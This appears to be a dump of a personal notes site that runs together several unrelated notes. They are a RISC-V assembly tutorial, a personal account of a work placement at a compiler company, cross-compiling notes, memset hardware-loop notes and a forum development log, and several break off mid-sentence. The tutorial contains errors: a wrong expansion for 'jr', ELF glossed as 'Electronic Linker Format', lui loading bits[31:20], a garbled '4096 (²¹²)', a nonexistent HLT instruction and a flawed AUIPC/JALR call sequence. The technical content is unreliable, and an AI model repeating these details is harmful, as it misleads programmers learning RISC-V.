RISC-V assembly language. First, an introduction to assembler and linker concepts, then sections describing assembler directives, pseudo- instructions, relocation functions, and assembler concepts such as labels, relative and absolute addressing, immediate values, constants and finally control and status registers.\n\nThe accompanying [RISC-V Instruction Set Reference](https://michaeljclark.github.io/isa) contains a listing of instruction in the `I` _(Base Integer Instruction Set)_ and `M` _(Multiply and Divide)_ extension. For detailed information on the RISC-V instruction set refer to the [RISC-V ISA Specification](http://riscv.org/specifications/).\n\n## Concepts\nThis section briefly covers some high level concepts that are required to understand the process of assembling and linking executable code from source files.\n\n### Assembly file\nAn assembly file contains assembly language directives, macros and instructions. It can be emitted by a compiler or it can be handwritten. An assembly file is the input file to the assembler. The standard extensions for assembly files are `.s` and `.S`, with the later indicating that the assembly file should be pre-processed using the C preprocessor.\n\n### Relocatable Object file\nA relocatable object file contains compiled object code and data emitted by the assembler. An object file cannot be run, rather it is used as input to the linker. The standard extension for object files is `.o`. The most common cross-platform file format for RISC-V executables is the ELF _(Electronic Linker Format)_ object file format. The `objdump` utility can be used to disassemble an object file, `objcopy` can be used to copy and extract sections from ELF files and the `nm` utility can list symbols in an object file.\n\nAn ELF file has an ELF header that contains _magic_ to indicate the file is ELF formatted, the architecture of the binary, the endianness of the binary _(little-endian for RISC-V)_, the ELF file type _(Relocatable Object File, Executable File, Shared Library)_, the number of program headers and their offset in the file, the number of section headers and their offset in the file, fields indicating the ELF version and ABI _(Application Binary Interface)_ version of the file and finally flags indicating various ABI options such as RVC compression and which floating- point ABI that the executable code in the binary conforms to.\n\nProgram Headers provide size and offsets of loadable segments within an executable file or shared object along with protection attributes used by the operating system _(read, write and exec)_. Program headers are not present in relocatable object files and are primarily for use by the operating system to and dynamic linker to map code and data into memory.\n\nSection Headers provide size, offset, type, alignment and flags of the sections contained within the ELF file. Section headers are not required to execute a static binary but are necessary for dynamic linking as well as program linking. Various section types refer to the location of the symbol table, relocations and dynamic symbols in the ELF binary file.\n\n### Sections\nAn object file is made up of multiple sections, with each section corresponding to distinct types of executable code or data. There are a variety of different section types. This list shows the four most common sections:\n\n-   `.text` is a read-only section containing executable code\n-   `.data` is a read-write section containing global or static variables\n-   `.rodata` is a read-only section containing const variables\n-   `.bss` is a read-write section containing uninitialised data\n\n### Program linking\nProgram linking is the process of reading multiple relocatable object files, merging the sections from each of the source files, calculating the new addresses for symbols and applying relocation [fixups](notes/general/fixups.md) to text or data that is pointed to in relocation entries.\n\n### Linker Script\nA linker script is a text source file that is optionally input to the linker and it contains rules for the linker to use when calculating the load address and alignment of the various sections when creating an executable output file. The standard extension for linker scripts is `.ld`.\n\n### Assembler Directives\nThe assembler implements a number of directives that control the assembly of instructions into an object file. These directives give the ability to include arbitrary data in the object file, control exporting of symbols, selection of sections, alignment of data, assembly options for compression, position dependent and position independent code.\n\nThe following are assembler directives for emitting data:\n\n| Directive | Arguments | Description |\n| --- | --- | --- |\n| `.2byte` |   | 16-bit comma separated words (unaligned) |\n| `.4byte` |   | 32-bit comma separated words (unaligned) |\n| `.8byte` |   | 64-bit comma separated words (unaligned) |\n| `.half` |   | 16-bit comma separated words

following are assembler directives for definition and exporing of symbols:\n\n| Directive | Arguments | Description |\n| --- | --- | --- |\n| `.globl` | symbol\\_name | emit symbol\\_name to symbol table (scope GLOBAL) |\n| `.local` | symbol\\_name | emit symbol\\_name to symbol table (scope LOCAL) |\n| `.equ` | name, value | constant definition |\n\nThe following directives are for selection of sections:\n\n| Directive | Arguments | Description |\n| --- | --- | --- |\n| `.text` |   | emit .text section (if not present) and make current |\n| `.data` |   | emit .data section (if not present) and make current |\n| `.rodata` |   | emit .rodata section (if not present) and make current |\n| `.bss` |   | emit .bss section (if not present) and make current |\n| `.comm` |

section (if not present, default .text) and make current |\n\nThe following directives includes options, macros and other miscellaneous functions:\n\n| Directive | Arguments | Description |\n| --- | --- | --- |\n| `.option` | {rvc,norvc,pic,nopic,push,pop} | RISC-V options |\n| `.macro` | name arg1 \\[, argn\\] | begin macro definition \\\\argname to substitute |\n| `.endm` |   | end macro definition |\n| `.file` | “filename” | emit filename FILE LOCAL symbol table |\n| `.ident` | “string” | accepted for source compatibility |\n| `.size` | symbol, symbol | accepted for source compatibility |\n| `.type` | symbol, @function | accepted for source compatibility |\n\n### Assembler Pseudo-instructions\nThe assembler implements a number of convenience pseudo-instructions that are formed from instructions in the base ISA, but have implicit arguments or in some case reversed arguments, that result in distinct semantics.\n\nThe following table lists RISC-V assembler pseudo instructions:\n\n| Pesudo-instruction | Expansion | Description |\n| --- | --- | --- |\n| `nop` | `addi zero,zero,0` | No operation |\n| `li rd, expression` | (several expansions) | Load immediate |\n| `la rd, symbol` | (several expansions) | Load address |\n| `mv rd, rs1` | `addi rd, rs, 0` | Copy register |\n| `not rd, rs1` | `xori rd, rs, -1` | One’s complement |\n| `neg rd, rs1` | `sub rd, x0, rs` | Two’s complement |\n| `negw rd, rs1` | `subw rd, x0, rs` | Two’s complement Word |\n| `sext.w rd, rs1` | `addiw rd, rs, 0` | Sign extend Word |\n| `seqz rd, rs1` | `sltiu rd, rs, 1` | Set if = zero |\n| `snez rd, rs1` | `sltu rd, x0, rs` | Set if ≠ zero |\n| `sltz rd, rs1` | `slt rd, rs, x0` | Set if \u003c zero |\n| `sgtz rd, rs1` | `slt rd, x0, rs` | Set if \u003e zero |\n| `fmv.s frd, frs1` | `fsgnj.s frd, frs, frs` | Single-precision move |\n| `fabs.s frd, frs1` | `fsgnjx.s frd, frs, frs` | Single-precision absolute value |\n| `fneg.s frd, frs1` | `fsgnjn.s frd, frs, frs` | Single-precision negate |\n| `fmv.d frd, frs1` | `fsgnj.d frd, frs, frs` | Double-precision move |\n| `fabs.d frd, frs1` | `fsgnjx.d frd, frs, frs` | Double-precision absolute value |\n| `fneg.d frd, frs1` | `fsgnjn.d frd, frs, frs` | Double-precision negate |\n| `beqz rs1, offset` | `beq rs, x0, offset` | Branch if = zero |\n| `bnez rs1, offset` | `bne rs, x0, offset` | Branch if ≠ zero |\n| `blez rs1, offset` | `bge x0, rs, offset` | Branch if ≤ zero |\n| `bgez rs1, offset` | `bge rs, x0, offset` | Branch if ≥ zero |\n| `bltz rs1, offset` | `blt rs, x0, offset` | Branch if \u003c zero |\n| `bgtz rs1, offset` | `blt x0, rs, offset` | Branch if \u003e zero |\n| `bgt rs, rt, offset` | `blt rt, rs, offset` | Branch if \u003e |\n| `ble rs, rt, offset` | `bge rt, rs, offset` | Branch if ≤ |\n| `bgtu rs, rt, offset` | `bltu rt, rs, offset` | Branch if \u003e, unsigned |\n| `bleu rs, rt, offset` | `bltu rt, rs, offset` | Branch if ≤, unsigned |\n| `j offset` | `jal x0, offset` | Jump |\n| `jr offset` | `jal x1, offset` | Jump register |\n| `ret` | `jalr x0, x1, 0` | Return from subroutine |\n\n### Relocation Functions\nThe relocation function directives create synthesise operand values that are resolved at program link time and are used as immediate parameters to specific instructions. The sections on absolute and relative addressing give examples of using the relocation functions.\n\nThe following table lists assembler functions used to generate relocations:\n\n| Assembler Notation | Description | Instructions |\n| --- | --- | --- |\n| `%hi(symbol)` | Absolute (HI20) | lui |\n| `%lo(symbol)` | Absolute (LO12) | loads, stores, adds |\n| `%pcrel_hi(symbol)` | PC-relative (HI20) | auipc |\n| `%pcrel_lo(label)` | PC-relative (LO12) | loads, stores, adds |\n| `%tprel_hi(symbol)` | TLS LE (Local Exec) | auipc |\n| `%tprel_lo(label)` | TLS LE (Local Exec) | loads, stores, adds |\n| `%tprel_add(offset)` | TLS LE (Local Exec) | add |\n\n### Labels\nText labels are used as branch, unconditional jump targets and symbol offsets. Text labels are added to the symbol table of the compiled module.\n\nNumeric labels are used for local references. References to local labels are suffixed with ‘f’ for a forward reference or ‘b’ for a backwards reference.\n\n### Absolute Addressing\nAbsolute addresses are used in position dependent code. An absolute address is formed using two instructions, the U-Type `lui` _(Load Upper Immediate)_ instruction to load `bits[31:20]` and an I-Type or S-Type instruction such as `addi` _(add immediate)_, `lw` _(load word)_ or `sw` _(store word)_ that fills in the low 12 bits relative to the upper immediate.\n\nThe following example shows how to load an absolute address:\n\n```\n.section .text\n.globl _start\n_start:\n    lui  a1,      %hi(msg)       # load msg(hi)\n    addi a1, a1,  %lo(msg)       # load msg(lo)\n    jalr ra, puts\n2:    j    2b\n\n.section .rodata\nmsg:\n    .string \"Hello World\\n\"\n```\n\nwhich generates the following assembler output and relocations as seen by objdump:\n\n```\n0000000000000000 \u003c_start\u003e:\n   0:000005b7          luia1,0x0\n0: R_RISCV_HI20msg\n   4:00858593          addia1,a1,8 # 8 \u003c.L21\u003e\n4: R_RISCV_LO12_Imsg\n```\n\n### Relative Addressing\nRelative addresses are used in position independent code. A PC-relative address is formed using two instructions, the U-Type `auipc` _(Add Upper Immediate Program Counter)_ instruction to load `bits[31:20]` relative to the program counter of the `auipc` instruction followed by an I-Type or S-Type instruction such as `addi` _(add immediate)_, `lw` _(load word)_ or `sw` _(store word)_.\n\nThe following example shows how to load a PC-relative address:\n\n```\n.section .text\n.globl _start\n_start:\n1:    auipc a1,     %pcrel_hi(msg) # load msg(hi)\n    addi  a1, a1, %pcrel_lo(1b)  # load msg(lo)\n    jalr  ra, puts\n2:    j     2b\n\n.section .rodata\nmsg:\n    .string \"Hello World\\n\"\n```\n\nwhich generates the following assembler output and relocations as seen by objdump:\n\n```\n0000000000000000 \u003c_start\u003e:\n   0:00000597          auipca1,0x0\n0: R_RISCV_PCREL_HI20msg\n   4:00858593          addia1,a1,8 # 8 \u003c.L21\u003e\n4: R_RISCV_PCREL_LO12_I.L11\n```\n\n### Constants\nConstants are emitted to the symbol table of the object but they do not take any space in the code or data sections. Constants can be referenced in expressions which emit relocations.\n\nThe following example shows loading a constant using the `%hi` and `%lo` assembler functions.\n\n```\n.equ UART_BASE, 0x40003000\n\n        lui a0,      %hi(UART_BASE)\n        addi a0, a0, %lo(UART_BASE)\n```\n\nThis example uses the `li` pseudo instruction to load a constant and writes a string using polled IO to a UART:\n\n```\n.equ UART_BASE,  0x40003000\n.equ REG_RBR,    0\n.equ REG_TBR,    0\n.equ REG_IIR,    2\n.equ IIR_TX_RDY, 2\n.equ IIR_RX_RDY, 4\n\n.section .text\n.globl _start\n_start:\n1:      auipc a0, %pcrel_hi(msg)    # load msg(hi)\n        addi  a0, a0, %pcrel_lo(1b)  # load msg(lo)\n2:      jal   ra, puts\n3:      j     3b\n\nputs:\n        li    a2, UART_BASE\n1:      lbu   a1, (a0)\n        beqz  a1, 3f\n2:      lbu   a3, REG_IIR(a2)\n        andi  a3, a3, IIR_TX_RDY\n        beqz  a3, 2b\n        sb    a1, REG_TBR(a2)\n        addi  a0, a0, 1\n        j     1b\n3:      ret\n\n.section .rodata\nmsg:\n    .string \"Hello World\\n\"\n```\n\n### Control and Status Registers\nControl and status registers are typically used to update privileged processor state however there are a few non-privileged instructions that access control and status registers such as the CSR pseudo-instructions `rdcycle`, `rdtime`, `rdinstret` for access to counters and `frcsr`, `frrm`, `frflags`, `fscsr`, `fsrm`, `fsflags`, `fsrmi` and `fsflagsi` for controling round mode and accessing floating point accrued exception state.\n\nThe following instructions allow reading, writing, setting and clearing bits in CSRs _(control and status registers)_:\n\n| CSR Operation | Description |\n| --- | --- |\n| `CSRRW rd, csr, rs1` | Control and Status Register Atomic Read and Write |\n| `CSRRS rd, csr, rs1` | Control and Status Register Atomic Read and Set Bits |\n| `CSRRC rd, csr, rs1` | Control and Status Register Atomic Read and Clear Bits |\n| `CSRRWI rd, csr, imm5` | Control and Status Register Atomic Read and Write Immediate |\n| `CSRRSI rd, csr, imm5` | Control and Status Register Atomic Read and Set Bits Immediate |\n| `CSRRCI rd, csr, imm5` | Control and Status Register Atomic Read and Write Immediate |\n\nThe following code sample shows how to enable interrupts, enable timer interrupts, and then set and wait for a timer interrupt to occur. The example uses CSR instructions and access to a platform specific MMIO _(memory mapped input output)_ region:\n\n```\n.equ RTC_BASE,      0x40000000\n.equ TIMER_BASE,    0x40004000\n\n# setup machine trap vector\n1:      auipc   t0, %pcrel_hi(mtvec)        # load mtvec(hi)\n        addi    t0, t0, %pcrel_lo(1b)       # load mtvec(lo)\n        csrrw   zero, mtvec, t0\n\n# set mstatus.MIE=1 (enable M mode interrupt)\n        li      t0, 8\n        csrrs   zero, mstatus, t0\n\n# set mie.MTIE=1 (enable M mode timer interrupts)\n        li      t0, 128\n        csrrs   zero, mie, t0\n\n# read from mtime\n        li      a0, RTC_BASE\n        ld      a1, 0(a0)\n\n# write to mtimecmp\n        li      a0, TIMER_BASE\n        li      t0, 1000000000\n        add     a1, a1, t0\n        sd      a1, 0(a0)\n\n# loop\nloop:\n        wfi\n        j loop\n\n# break on interrupt\nmtvec:\n        csrrc   t0, mcause, zero\n        bgez    t0, fail       # interrupt causes are less than zero\n        slli    t0, t0, 1      # shift off high bit\n        srli    t0, t0, 1\n        li      t1, 7          # check this is an m_timer interrupt\n        bne t0, t1, fail\n        j pass\n\npass:\n        la      a0, pass_msg\n        jal     puts\n        j       shutdown\n\nfail:\n        la      a0, fail_msg\n        jal     puts\n        j       shutdown\n\n.section .rodata\n\npass_msg:\n        .string \"PASS\\n\"\n\nfail_msg:\n        .string \"FAIL\\n\"\n```\n\n### Addresses, Jumps and Labels\nFor a RISC-V program we know every instruction takes 32-bits. That corresponds to 4 bytes. Thus in a program the first instruction will typically be at address 0, the second at 4, the third at 8 and so on.\n\nLet us write out an earlier program with addresses in the first column to make it easier to see how jumps work. First let us clarify a jump or branch is. If you want to repeat part of your code several times over you need to make a jump to a previous instruction.\n\nThe microprocessor keeps track of the next instruction to execute with a special register called the _Program Counter (PC)_. It gives the address in bytes of the next instruction to execute. Since each instruction is 4 bytes long, the PC gets incremented by 4 each time.\n\nLet us look at an example:\n\n```as\nBEQ x2, x4, 12\n```\n\nThe `BEQ` instruction means branch or jump if registers are **EQ**ual. If `x2 = x4` then the program counter (PC) will be updated to:\n\n```as\nPC ← PC + 12\n```\nThat means jumping 3 instructions forward. That means we skip the next two instructions. Let us look at the count down program from earlier. The first column contains the instruction address:\n\n```as\n00:  ADDI x2, zero, 1   # x2 ← 0  + 1     \n04:  SUB x1, x1, x2     # x1 ← x1 - 1  \n08:  SW  x1, 4(zero)    # x1 → [4 + 0]  \n12:  BLT zero, x1, -8   # 0 \u003c x1 =\u003e PC ← PC - 8 = 4  \n16:  HLT                # Halt, stop execution\n```\n\nYou can copy this to the simulator without the address column. What you see here is that branching is relative to where you are. On line `12`, we want to check if `x1` is still larger than zero to see if we should continue our countdown. If it is we want to jump to line `04` where we use `SUB` to subtract 1 from `x1`. However we don't write `BLT zero, x1, 4`. Instead we specify `-8`. That is because jumps are relative. We jump two instructions backwards.\n\nThis is in fact quite practical because it means we could move our program to a different location in memory and it would still work. However more importantly it saves a lot of space. You only got 32-bits to encode an instruction:\n\n-   Each register requires 5 bits to encode and the branch specifies two registers which eats up 10-bits.\n-   The opcode and function eat up 10-bits.\n-   That leaves 12-bits to specify an address to jump to. The maximum number you get with 12-bits is 4096 (²¹²). Thus if your program was larger than 4 KB you couldn’t perform jumps.\n\nWith relative addressing this is not a problem. You can jump 2048 bytes backwards or forwards in the program. Most for-loops, while-loop and if-statement will not be larger than that.\n\nHowever there is one problem with relative addressing. It is awkward for the programmer to write. This is where address labels save us:\n\n```as\nADDI x2, x0, 1  \n  \nloop:  \n   SUB x1, x1, x2  \n   SW  x1, 4(x0)   \n   BLT x0, x1, loop\n```\n\nYou can simply label the location you want to jump. Here we use the label `loop`. Use a colon to indicate this is a label. The assembler will use the label to calculate what offset needs to be used to jump to the given label. Thus depending on what instruction is using the `loop` label, a different offset will be calculated.\n\nOk let us look at different types of jumps. An instruction which makes an unconditional jump start with a `J`. Jumps which are conditional start with a `B` for Branch.\n\n## Instructions\n### Branching — Conditional Jumps\nFor conditional branching we compose the mnemonic from a `B` and a two or three letter combination describing the condition such as:\n\n-   `EQ` = **EQ**ual.\n-   `NE` ≠ **N**ot **E**qual.\n-   `LT` \u003c **L**ess **T**han.\n-   `GE` ≥ **G**reater or **E**qual.\n\nLet us look at a few examples of what that would translate to:\n\n```as\nBEQ x2, x4, offset    # x2 = x4  =\u003e PC ← PC + offset  \nBNE x2, x4, offset    # x2 ≠ x4  =\u003e PC ← PC + offset  \nBLT x2, x4, offset    # x2 \u003c x4  =\u003e PC ← PC + offset  \nBGE x2, x4, offset    # x2 ≥ x4  =\u003e PC ← PC + offset\n```\n\n### Unconditional Jumps\nOften we need to jump around in code without checking if a condition is true or false. Examples of this are:\n\n-   Calling a function. That means setting `a` registers to function inputs and doing a unconditional jump to location in memory where instructions for function reside.\n-   Returning from a function. When we are done executing code in a function we need to return to instruction after call-site.\n\nBut often you simply need to make unconditional jumps to deal with different conditions.\n\n### Jump and Link — JAL\nThe `JAL` instruction can be used for both calling functions or just make a simple unconditional jump.\n\n`JAL` makes a relative jump (relative to PC) just like the conditional branch instructions. However the provided register argument is not used for comparisons but to store return address. If you don't want to store the return address you can simply provide the `zero` register `x0`.\n\n```as\nJAL rd, offset    # rd ← PC + 4, PC ← PC + offset\n```\n\nThe convention used with RISC-V is that the return address should be stored with the return address register `ra` which is `x1`. Say you got some C code with call like this:\n\n```c\nfoobar(2, 3)\n```\n\nIn assembly this would be:\n\n```as\nADDI a0, zero, 2  \nADDI a1, zero, 3  \nJAL  ra, foobar\n```\n\nWhy the emphasis on relative jumps in RISC-V? In earlier CPUs jumps where typically to absolute addresses. The reason is that in modern operating systems, one needs to be able to move code around in memory. Thus a developer cannot know the position of his or her code in memory. A relative jump will always work, regardless of where in memory a program is placed.\n\n### Jump and Link Register — JALR\nThis is really the same instruction but with the difference that we use an offset from register? What is the point of that?\n\nIn `JAL` there is simply not enough space to encode a full 32-bit address. That means you cannot jump anywhere in the code if you are in a larger program. But if you use an address contained in a register, you can jump to any address.\n\nOther than that `JALR` works almost the same as `JAL`. It will also store the return address in `rd`.\n\n```as\nJALR rd, offset(rs1)    # rd ← PC + 4, PC ← rs1 + offset\n```\n\nA big difference is that `JALR` jumps are not relative to `PC`. Instead it is relative to `rs1` .\n\nWhile we could use a regular `ADDI` function to set the `rs1` register that is impractical. We want an address relative to the program counter (PC). Fortunately we have a special instruction `AUIPC` which stands for: Add Upper Immediate to PC.\n\n```as\nAUIPC rd, immediate    # rd ← PC + immediate[31:12] \u003c\u003c 12\n```\n\nThe explanation may be hard to read, but it basically just means that we store the upper 20-bits of the offset to some label in the upper 20-bits of the `rd` register.\n\nThe `JALR` offset can be 12-bits wide, so together (20 + 12 = 32) they make up a 32-bit address. `JAL` uses a 20-bit address, so if you need to call a function `foobar` further away than that we use a combination of `AUIPC` and `JALR` like this:\n\n```as\nADDI   a0, zero, 2       # Set first argument to function  \nADDI   a1, zero, 3       # Set second argument.  \nAUIPC  t0, foobar        # Store upper 20-bits address of foobar  \nJALR   ra, foobar(t0)    \n```\n\n### Load Immediate\nThe `li` _(load immediate)_ instruction is an assembler pseudo instruction that is used to synthesise constants. The `li` pseudo instruction will emit a sequence starting with `lui` followed by `addi` and `slli` _(shift left logical immediate)_ to construct constants by shifting and adding.\n\nThe following example shows the `li` pseudo instruction being used to load an immediate value:\n\n```\n.section .text\n.globl _start\n_start:\n\n.equ CONSTANT, 0xcafebabe\n\n        li a0, CONSTANT\n```\n\nwhich generates the following assembler output as seen by objdump:\n\n```\n0000000000000000 \u003c_start\u003e:\n   0:00032537          lui     a0,0x32\n   4:bfb50513          addi    a0,a0,-1029\n   8:00e51513          slli    a0,a0,0xe\n   c:abe50513          addi    a0,a0,-1346\n```\n\n### Load Address\nThe `la` _(load address)_ instruction is an assembler pseudo- instruction used to load the address of a symbol or label. The instruction can emit absolute or relative addresses depending on the `-fpic` or `-fno-pic` assembler command line options or an `.options pic` or `.options nopic` assembler directive. The pseudo-instruction emits a relocation so that the address of the symbol can be fixed up during program linking.\n\nThe following example uses the `la` pseudo instruction to load a symbol address:\n\n```\n.section .text\n.globl _start\n_start:\n\n        la a0, msg\n\n.section .rodata\nmsg:\n    .string \"Hello World\\n\"\n```\n\nwhich generates the following assembler output and relocations as seen by objdump:\n\n```\n0000000000000000 \u003c_start\u003e:\n   0:00000517          auipca0,0x0\n0: R_RISCV_PCREL_HI20msg\n   4:00850513          addia0,a0,8 # 8 \u003c_start+0x8\u003e\n4: R_RISCV_PCREL_LO12_I.L11\n```\n\n## Resources\n-   [Venus](https://www.kvakil.me/venus/) — This is a natural next step to learn RISC-V.

But with this you can also simulate connections to different hardware such as keypads, seven-segment displays, bitmap displays etc. Lots of tools to analyze registers, memory, performance.\n-   [Ripes](https://github.com/mortbopet/Ripes) —An advanced Qt based GUI application for simulating RISC-V, and writing assembly code. This is a quite a lot more advanced. It shows a diagram of the CPU, where you can look at values flowing between different functional units at each clock cycle. Harder for beginners as you don’t really step one instruction at a time, but a clock cycle, and an instruction will take multiple clock cycles to complete. It also simulates a pipeline so that several instructions are in flight at once.\n-   [Assembly directives and instruction](https://michaeljclark.github.io/asm.html) — An overview by creator of the rv8 simulator which tells you want directives like `.text` `.data` means as well as pseudo instructions like `NOP`, `NOT`, `NEG` and `LI` means. Pseudo instruction are not actually defined in the ISA but shorthand for one or more common ISA instructions.\n\nIt is worth noting that a lot of these different assemblers use many of the same concepts and conventions. Many have e.g. an `ecall` instruction added which lets you call functions for printing out to console.

At Embecosm we work on the boundary of hardware, more specifically with compilers. Compiler are programs that translate one computer language into another, I'm not going to go in detail about it but for the computing students it basically translates from a high level language, like C, Python or Rust, to a low level language, like assembly. \n\nMy work involves a lot of coding - so a lot of problem solving, time management and constant learning as things get upgraded, documentation changes and just new skills you have to pick up for different projects.\n\nI didn't know a thing about compilers when I first applied. That was never an\nissue though. So... \n\n## How did I get here?\nI moved from Brazil in 2017 and ended up being put in a Level 2 BTEC in ICT (Information and Creative Technology) given my interest in studying Computer Science at Uni. \n\nAfter that, I did a BTEC Level 3 in IT which was again recommended to me as an aspiring Computer Science student.\n\nBesides online courses that I took out of my own interest, those two courses were the first formal training that I had in any sort of computing.\n\nIT was not what I really wanted to do, but my college didn't have any sort of Computer Science BTEC's so I had to get through it and just study things that really interest me on my spare time.\n\n///me as someone that already knows what they want to study. BTEC's aren't always the best option, in my specific situation A level Maths is an entry requirement for every Uni I wanted to go. And taking A level Maths just wasn't possible with my timetable, so I ended up not meeting the requirements. So the message here is please check your requirements and please question what people think is ///\n\nthe best for you, it might not be.\n\nI ended up finding Embecosm when I had to apply for my work experience week. They were in the college's database as a company that normally does take students from my college. \n\nIt was only one the places I applied, I basically applied to anything computer related as I was very keen in getting some experience in the real world -- because even if I didn't enjoy the placement I would at least know what I don't enjoy doing.\n\nI emailed Embecosm towards the end of October 2018 asking if there were any vacancies available for work experience in March. I was told that Embecosm already agreed to take one work experience student, and would only consider a second one if they have a particular passion for the field.\n\nThankfully, I was offered to go there and talk to Jeremy. I was extremely nervous about going as I really didn't know what to expect and was very scared that I was biting more than I could chew. So I went for the interview and was just very honest with Jeremy. \n\nI told him that I was still learning the basics, that I didn't really have any projects to show him beside assignments and simple programs that I wrote to help me apply what we were learning at college. However, I told him that I'm very keen to self study anything that would be helpful for the placement - something that I was kind of used to do as my course didn't really have much of a focus on computing oriented subjects as it was an IT course.\n\nI also told him that I was (and well, am) very interested in AI (Artificial Intelligence), which I guess showed him my interest and engagement with the computing field. I walked out of Embecosm with my work placement guaranteed (yay). But, more than that, Jeremy offered me to work there part-time so I could gain knowledge and experience leading to the work experience week, something that I really wasn't expecting and was just so awesome. Yes, I did get paid for all of it. \n\n## How did it go?\nSo as I said, I really didn't have much experience. I was extremely excited though, it is not every day that you get an opportunity like that. I asked my supervisor for material to study, which gave some pointers on what skills I needed to focus on. From there I just worked on those skills using a lot of Google. \n\nThere is a surprisingly big amount of content on learning computer science from home, there are recorded lectures, free courses and even just full curriculums for you to follow.  \n\nMy work experience project, was together with my supervisor, to implement an AI filtering system on a board for a real Embecosm client. Very cool. Again to my surprise, I was offered to fly to Sillicon Valley to work on it as the client was based there. Very unexpected. \n\nSo yeah, I got to go there and I worked with the client for a week. It was hard, dealing with clients in general can be hard, even though my supervisor was the one mostly doing it (poor him) I still got to watch him closely and engage in the meetings. \n\nAfter that I started my own little project, which was facial recognition on a Google board. It was very fun and productive, I got to explore the board and it's capabilities as well as implement different AI systems, work with testing, debugging and just hardware in general. I also wrote a series of blog posts about it. \n\nAnd now I actually work with compilers. Embecosm provided me, and other staff, with a Graduate Training program where we in a period of around 2/3 months looked at core skills for engineers, basically a very very compact version of a Computer Science degree.\n\n## What now?\nSince then I joined two different projects, having the opportunity to be the project lead for part of one of them. For the future I plan to start at Brunel in September to study Computer Science.

All of these are packaged together for each target (e.g., arm64, x86) in a directory called `sysroot`. When we compile a program, we need to pass the path to `sysroot` for a compiler to know where to look for standard headers during compilation, and where to look for common libraries (`libc`, `libstdc++`, etc.) during linkage.\n\nNormally, when we compile a program for the same machine, the compiler uses the standard headers available in `/usr/include` and libraries from `/usr/lib`. These paths are hardcoded in the compiler itself, so we never have to think about it. However, when building a custom compiler or when cross-compiling programs, we tell the compiler where the `sysroot` is by passing a flag (e.g. `gcc --sysroot=\"/path/to/arm64/sysroot/usr\" hello.cpp`). \n\nMost often, pre-packaged cross compilers come with a script/binary that has a `sysroot` path embedded into it (e.g., `aarch64-linux-gnu-gcc)` [g++-10-aarch64-linux-gnu (10.3.0-8ubuntu1cross1) package](10.3.0-8ubuntu1cross1)%20package).","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["work/engineer-training"]},"/notes/private/work/testing-relaxation-corev":{"title":"Testing Relaxation - COREV","content":"`readelf -r` on .o files -\u003e looks for particular relocations -\u003e instead of -a\nit checks if we're getting the right relocation\n\nConstruct a file that we know it is going to relax, so you could create an assembly file with a cv.start and a reference to something that it is away and put in between stuff that we know it will get relaxed away.

So for a large memset/memcpy, instead of generating a call to implementation we should be able to generate an inline hardware loop.\n\n### The approach\n1. Replace the implementation of memset/memcpy with a handwritten assembly implementation using a hardware loop in newlib. This should give an idea of whether it is worth expanding this in the compiler.\n\nIf I look [here] (https://tiger.git.embecosm.com/tiger/newlib/-/tree/tiger-3.3.0-newlib/newlib/libc/machine/bsc)\n\nI'll need to add a `memset.s` and `memcpy.s` to the directory above.\n\nThen update the `Makefile.am` to refer to `memset.s` and `memcpy.s` (like `setjmp.s` in the `lib_a_SOURCES` variable in that file)\n\nFinally run `automake` from that directory to regenerate `Makefile.in`\n\n(Might run into assembly bugs)\n\n## More stuff\nThis is the optimisation: https://tiger.git.embecosm.com/tiger/llvm-project/-/issues/113\n\nI need to write a memset.S and a memcpy.S using hardware loops.\n\nThere's a file newlib/libgloss/bsc/crt0.S which has an example of some assembly code. It looks like this:\n\n```assembly\n  .text\n  .global _start\n  .type   _start, @function\n_start:\n  # clear bss \n  mviu r0, __bss_start\n  mviu r1, __bss_end\n  mvib r2, 0\n.Lbss_clear_start:\n  ge r0, r1\n  jc .Lbss_clear_end\n  stw r2, r0, 1\n  j .Lbss_clear_start\n.Lbss_clear_end:\n\n  # For now set the stack pointer to the end of the data section.\n  # For now just set the stack pointer to the end of the data section.\n  # Since the stack pointer rises and nothing is allocated to the memory\n  # afterwards this essentially allocates any remaining memory to the stack.\n  mviu sp, __stack_start\n\n  # Set argc and argv with 0\n  mvib r0, 0\n  mvib r1, 0\n  cl main\n  cl exit\n  .size  _start, .-_start\n```\n\nThe start of memset.S would probably look like this:\n\n```\n  .text\n  .global memset\n  .type memset,@function\nmemset:\n  ... \u003c\u003c\u003c stuff goes here\n  ret\n```\n\nAs for how to write a memset, you have three arguments: a pointer to the destination, a value to write, and a size to write. Where these arguments are depends on the calling convention which is defined in the compiler in `BSCCallingConv.td`, but the short answer is that they will be in the registers r0, r1 and r2\n\nAs for the instructions you can use - there's documentation of the instructions here: https://tiger.git.embecosm.com/tiger/bst/-/blob/master/simple-iss-cronus/doc/cronus.md\n\nYou might also need to look at the `BSCInstrInfo.td` in the compiler to work out the exact syntax though.\n\nA good starting point for assembly might be to see what gets generated at the moment.  Code for a really simple memset looks like this:\n\n```c\nvoid memset(char *dst, int value, int size) {\n  for (int i = 0; i \u003c size; i++)\n    dst[i] = value;\n}\n```\n\nIf you compile that with `bsc-elf-clang -O1 -S test.c` you'll get a `test.s` which might be a good example of what the assembly looks like\n\nIt looks like this:\n\n```assembly\n        .text\n        .file   \"test.c\"\n

Initial development of the forum\n    Started by laying out the forum and offering support to smaller screens. Also started working on the navbar.\n    \n    The log in system seems tricky. I have duplicated the one used for the game with the main reason being the redirection. I am unsure on how to have multiple redirections.\n\n2. Got it to retrieve username from database\n    The forum now displays the username on the top of the screen.\n\n3. Username now sticks to the right and added search bar\n    Fixed the issue in the previous commit where I couldn't get the username to stick to the top right of the screen.\n    \n    I've also added a search bar which currently doesn't do anything.\n\n### 07/12\n4. Started to implement posts page\n    I modified the navbar to have a section dedicated to the posts within the forum. The user can also go to the main page of the forum from the navbar.\n    \n    The posts page contains the posts within the forum.\n\n5. Finished posts page\n    Finished laying out the posts page and now working on an extra one which will add details to the forum.\n\n6. Minor design fixes\n    The grey in the index page was different then the one in the posts page. The \"Forum - Stats\" box was also weirdly positioned.\n    \n    I had to adjust the grey to a darker colour to take in account the yellow for the hyperlinks.\n\n7. Finished front-end\n    I am now going to dig in the backend, using Django.\n    \n    I have added a button to comment and a button to reply, however they are not functional. It is probably a good idea to rename the `detail.php` page.\n\n## Back-End\n---\n8. Trying to use Django\n    Here I am setting up Django, having to fix some minor issues with the paths, mainly for templates.\n    \n    Everything should be set up here but nothing substantial has been implemented.\n\n9. Forum running under Django\n    Fixed all paths and the website seems to be running, however navigation seems not to work.\n\n10. Added admin and a test user as well as a test post\n    Started populating the database and now have a test Post under 